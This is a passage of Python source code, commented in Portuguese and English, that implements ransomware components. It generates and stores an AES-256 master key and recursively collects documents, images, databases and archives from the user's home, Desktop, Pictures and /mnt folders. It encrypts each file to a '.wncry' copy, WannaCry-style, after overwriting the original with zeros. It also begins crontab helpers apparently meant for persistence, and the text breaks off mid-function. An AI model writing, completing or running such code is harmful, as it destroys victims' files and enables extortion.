import os
import json
import base64
import secrets
import stat
import sys
import subprocess
from pathlib import Path
from typing import List
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def gerar_chave_mestra(path: str = "/tmp/.master.key") -> None:
    """Generate a random 256‑bit AES‑GCM key, encode it in Base64,
    and store it in a JSON file with secure permissions.

    The file will contain: {"aes_key":"<base64_value>"} and will be created
    with mode 0o600 (read/write for owner only). If the file already exists,
    a FileExistsError is raised.
    """
    try:
        # Generate 32 random bytes (256 bits)
        key_bytes = secrets.token_bytes(32)
        key_b64 = base64.b64encode(key_bytes).decode("utf-8")

        payload = {"aes_key": key_b64}
        json_data = json.dumps(payload).encode("utf-8")

        # Securely create the file with restrictive permissions
        flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
        fd = os.open(path, flags, 0o600)  # mode 0o600 ensures owner read/write only
        with os.fdopen(fd, "wb") as f:
            f.write(json_data)

        # Explicitly set permissions in case umask altered them
        os.chmod(path, 0o600)

    except Exception as exc:
        raise RuntimeError(f"Failed to generate and store master key: {exc}") from exc


def enumerar_arquivos_alvo() -> List[str]:
    """
    Varre recursivamente diretórios alvo e retorna a lista de caminhos completos
    de arquivos que atendem aos critérios de extensão e exclusão.

    Diretórios escaneados:
        - Home do usuário (~)
        - Documentos / Documents
        - Área de Trabalho / Desktop
        - Imagens / Pictures
        - /mnt
        - ~/Documentos_Teste

    Extensões aceitas (case‑insensitive):
        .xlsx .docx .pdf .txt .csv .jpg .png .db .backup .psd .zip .rar

    Arquivos excluídos se terminarem com (case‑insensitive):
        .bak .backup .old
    """
    extensoes_permitidas = {
        ".xlsx", ".docx", ".pdf", ".txt", ".csv",
        ".jpg", ".png", ".db", ".backup", ".psd",
        ".zip", ".rar"
    }

    extensoes_excluir = (".bak", ".backup", ".old")

    home = Path.home()
    dirs_base = [
        home,
        home / "Documents",
        home / "Documentos",
        home / "Desktop",
        home / "Área de Trabalho",
        home / "Pictures",
        home / "Imagens",
        Path("/mnt"),
        home / "Documentos_Teste"
    ]

    arquivos_encontrados: List[str] = []

    for base in dirs_base:
        if not base.exists() or not base.is_dir():
            continue
        for root, _, files in os.walk(base, topdown=True, onerror=lambda e: None):
            raiz_path = Path(root)
            for nome_arquivo in files:
                nome_arquivo_lower = nome_arquivo.lower()
                if nome_arquivo_lower.endswith(extensoes_excluir):
                    continue
                extensao = Path(nome_arquivo).suffix.lower()
                if extensao in extensoes_permitidas:
                    caminho_completo = str(raiz_path / nome_arquivo)
                    arquivos_encontrados.append(caminho_completo)

    return arquivos_encontrados


def criptografar_arquivo(caminho_arquivo: str, chave_mestra: bytes) -> None:
    """
    Criptografa um arquivo usando AES‑256‑GCM e substitui o arquivo original
    por um arquivo com extensão ``.wncry`` contendo [nonce | ciphertext | tag].

    Parameters
    ----------
    caminho_arquivo : str
        Caminho completo do arquivo a ser protegido.
    chave_mestra : bytes
        Chave de 32 bytes (256 bits) usada para o algoritmo AES‑GCM.
    """
    if not isinstance(chave_mestra, (bytes, bytearray)):
        raise TypeError("chave_mestra deve ser do tipo bytes")
    if len(chave_mestra) != 32:
        raise ValueError("chave_mestra deve ter exatamente 32 bytes (AES‑256)")

    caminho = Path(caminho_arquivo)
    if not caminho.is_file():
        raise FileNotFoundError(f"Arquivo não encontrado: {caminho_arquivo}")

    novo_caminho = caminho.with_suffix('.wncry')
    temp_written = False

    try:
        nonce = secrets.token_bytes(12)

        with caminho.open('rb') as f_in:
            plaintext = f_in.read()

        aesgcm = AESGCM(chave_mestra)
        ct_with_tag = aesgcm.encrypt(nonce, plaintext, None)
        ciphertext, tag = ct_with_tag[:-16], ct_with_tag[-16:]

        tamanho = len(plaintext)
        with caminho.open('r+b') as f_orig:
            f_orig.seek(0)
            f_orig.write(b'\x00' * tamanho)
            f_orig.flush()
            os.fsync(f_orig.fileno())

        with novo_caminho.open('wb') as f_out:
            f_out.write(nonce + ciphertext + tag)
            f_out.flush()
            os.fsync(f_out.fileno())
        temp_written = True

    except Exception:
        if temp_written and novo_caminho.exists():
            try:
                novo_caminho.unlink()
            except Exception:
                pass
        raise


class CrontabError(RuntimeError):
    """Exception raised for errors interacting with the user's crontab."""


def _run_crontab_list() -> List[str]:
    """Execute `crontab -l` and return the current crontab lines."""
    result = subprocess.run(
        ["crontab", "-l"],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        if "no crontab for" in result.stderr.lower():
            return []
        raise CrontabError(
            f"Failed to list crontab (exit {result.returncode}): {result.stderr.strip()}"
        )
    return [line.rstrip("\n") for line in result.stdout.splitlines()]


def _install_new_crontab(lines: List[str]) -> None:
    """Install a new crontab from the supplied lines."""
    crontab_data = "\n".join(lines) + "\n"
    result = subprocess.run(
        ["crontab", "-"],
        input=crontab_data,
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        raise CrontabError